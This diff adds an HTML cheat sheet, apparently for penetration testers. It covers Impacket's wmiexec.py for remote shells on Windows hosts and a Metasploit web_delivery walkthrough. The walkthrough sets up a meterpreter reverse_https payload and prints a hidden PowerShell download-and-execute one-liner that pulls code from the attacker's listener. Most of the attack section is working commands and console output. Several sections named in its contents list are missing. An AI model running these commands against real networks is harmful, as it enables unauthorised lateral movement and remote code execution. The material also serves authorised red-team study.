@@ -1,0 +1,155 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Attackerkb Reference</title>
+</head><body>Help Output &nbsp;<br/>
+Basic Shell &nbsp;<br/>
+Shell with Hashes &nbsp;<br/>
+Shell with Kerberos &nbsp;<br/>
+Shell with aesKey &nbsp;<br/>
+Web Delivery plus WMIEXEC through a Metasploit socks4a Proxy &nbsp;<br/>
+<br/>
+<b>Help Output </b>&nbsp;<br/>
+Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies<br/>
+<br/>
+usage: wmiexec.py [-h] [-share SHARE] [-nooutput] [-debug]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; target [command [command ...]]<br/>
+<br/>
+Executes a semi-interactive shell using Windows Management Instrumentation.<br/>
+<br/>
+positional arguments:<br/>
+&nbsp; target &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[[domain/]username[:password]@]&lt;targetName or address&gt;<br/>
+&nbsp; command &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; command to execute at the target. If empty it will<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; launch a semi-interactive shell<br/>
+<br/>
+optional arguments:<br/>
+&nbsp; -h, --help &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;show this help message and exit<br/>
+&nbsp; -share SHARE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;share where the output will be grabbed from (default<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ADMIN$)<br/>
+&nbsp; -nooutput &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; whether or not to print the output (no SMB connection<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; created)<br/>
+&nbsp; -debug &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Turn DEBUG output ON<br/>
+<br/>
+authentication:<br/>
+&nbsp; -hashes LMHASH:NTHASH<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NTLM hashes, format is LMHASH:NTHASH<br/>
+&nbsp; -no-pass &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;don't ask for password (useful for -k)<br/>
+&nbsp; -k &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Use Kerberos authentication. Grabs credentials from<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ccache file (KRB5CCNAME) based on target parameters.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; If valid credentials cannot be found, it will use the<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ones specified in the command line<br/>
+&nbsp; -aesKey hex key &nbsp; &nbsp; &nbsp; AES key to use for Kerberos Authentication (128 or 256<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; bits)<br/>
+<br/>
+<b>Getting Shells</b>&nbsp; <br/>
+Getting shells is awesome, but there is a reason why you don't want to just run cmd.exe as the executable to run. Impacket has a special thing it does when you leave the executable off that allows for uploads and downloads, which cmd.exe<br/>
+<b><br/>
+</b><b>Basic Shell</b>&nbsp; <br/>
+The basic shell in wmiexec.py is essentially %COMSPEC% / cmd.exe with one tine difference, you can upload and download directly from it. This holds a lot of weight when you think about the capabilities to authenticate that Impacket has (password/hashes/kerberos).<br/>
+<br/>
+python wmiexec.py administrator@172.16.102.135<br/>
+Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies<br/>
+<br/>
+Password:<br/>
+[*] SMBv2.1 dialect used<br/>
+[!] Launching semi-interactive shell - Careful what you execute<br/>
+[!] Press help for extra shell commands<br/>
+C:\temp&gt;<br/>
+C:\temp&gt;help<br/>
+<br/>
+&nbsp;lcd {path} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; - changes the current local directory to {path}<br/>
+&nbsp;exit &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; - terminates the server process (and this session)<br/>
+&nbsp;put {src_file, dst_path} &nbsp; - uploads a local file to the dst_path (dst_path = default current directory)<br/>
+&nbsp;get {file} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; - downloads pathname to the current local dir<br/>
+&nbsp;! {cmd} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;- executes a local shell cmd<br/>
+<br/>
+C:\temp&gt;get test.log<br/>
+[*] Downloading C:\\temp\test.log<br/>
+<br/>
+<b>Web Delivery plus WMIEXEC through a Metasploit socks4a Proxy </b>&nbsp;<br/>
+First, we assume that you already have a single shell, one way or another into a corporate network. The internal range used by the network you've gotten a shell on is 172.16.102.0/24 and you are running as an admin.<br/>
+<br/>
+msf exploit(web_delivery) &gt; set SRVPORT 8443<br/>
+SRVPORT =&gt; 8443<br/>
+msf exploit(web_delivery) &gt; set URIPATH /download<br/>
+URIPATH =&gt; /download<br/>
+msf exploit(web_delivery) &gt; set LPORT 8443<br/>
+LPORT =&gt; 8443<br/>
+msf exploit(web_delivery) &gt; set TARGET 2<br/>
+TARGET =&gt; 2<br/>
+msf exploit(web_delivery) &gt; show targets<br/>
+msf exploit(web_delivery) &gt; set PAYLOAD windows/meterpreter/reverse_https<br/>
+PAYLOAD =&gt; windows/meterpreter/reverse_https<br/>
+<br/>
+Exploit targets:<br/>
+<br/>
+&nbsp; &nbsp;Id &nbsp;Name<br/>
+&nbsp; &nbsp;-- &nbsp;----<br/>
+&nbsp; &nbsp;0 &nbsp; Python<br/>
+&nbsp; &nbsp;1 &nbsp; PHP<br/>
+&nbsp; &nbsp;2 &nbsp; PSH<br/>
+<br/>
+<br/>
+msf exploit(web_delivery) &gt; show options<br/>
+<br/>
+Module options (exploit/multi/script/web_delivery):<br/>
+<br/>
+&nbsp; &nbsp;Name &nbsp; &nbsp; Current Setting &nbsp;Required &nbsp;Description<br/>
+&nbsp; &nbsp;---- &nbsp; &nbsp; --------------- &nbsp;-------- &nbsp;-----------<br/>
+&nbsp; &nbsp;SRVHOST &nbsp;0.0.0.0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;yes &nbsp; &nbsp; &nbsp; The local host to listen on. This must be an address on the local machine or 0.0.0.0<br/>
+&nbsp; &nbsp;SRVPORT &nbsp;8443 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; yes &nbsp; &nbsp; &nbsp; The local port to listen on.<br/>
+&nbsp; &nbsp;SSL &nbsp; &nbsp; &nbsp;false &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;no &nbsp; &nbsp; &nbsp; &nbsp;Negotiate SSL for incoming connections<br/>
+&nbsp; &nbsp;SSLCert &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; no &nbsp; &nbsp; &nbsp; &nbsp;Path to a custom SSL certificate (default is randomly generated)<br/>
+&nbsp; &nbsp;URIPATH &nbsp;/download &nbsp; &nbsp; &nbsp; &nbsp;no &nbsp; &nbsp; &nbsp; &nbsp;The URI to use for this exploit (default is random)<br/>
+<br/>
+<br/>
+Payload options (windows/meterpreter/reverse_https):<br/>
+<br/>
+&nbsp; &nbsp;Name &nbsp; &nbsp; &nbsp;Current Setting &nbsp;Required &nbsp;Description<br/>
+&nbsp; &nbsp;---- &nbsp; &nbsp; &nbsp;--------------- &nbsp;-------- &nbsp;-----------<br/>
+&nbsp; &nbsp;EXITFUNC &nbsp;process &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;yes &nbsp; &nbsp; &nbsp; Exit technique (Accepted: , , seh, thread, process, none)<br/>
+&nbsp; &nbsp;LHOST &nbsp; &nbsp; 172.16.102.1 &nbsp; &nbsp; yes &nbsp; &nbsp; &nbsp; The listen hostname<br/>
+&nbsp; &nbsp;LPORT &nbsp; &nbsp; 8443 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; yes &nbsp; &nbsp; &nbsp; The listen port<br/>
+<br/>
+<br/>
+Exploit target:<br/>
+<br/>
+&nbsp; &nbsp;Id &nbsp;Name<br/>
+&nbsp; &nbsp;-- &nbsp;----<br/>
+&nbsp; &nbsp;2 &nbsp; PSH<br/>
+<br/>
+<br/>
+msf exploit(web_delivery) &gt; set SSL true<br/>
+SSL =&gt; true<br/>
+msf exploit(web_delivery) &gt; exploit -j<br/>
+[*] Exploit running as background job.<br/>
+msf exploit(web_delivery) &gt;<br/>
+[*] Started reverse handler on 172.16.102.1:8443<br/>
+[*] Using URL: https://0.0.0.0:8443/download<br/>
+[*] Local IP: https://192.168.92.105:8443/download<br/>
+[*] Server started.<br/>
+[*] Run the following command on the target machine:<br/>
+powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX ((new-object net.webclient).downloadstring('https://172.16.102.1:8443/download'))<br/>
+<br/>
+msf exploit(web_delivery) &gt;<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
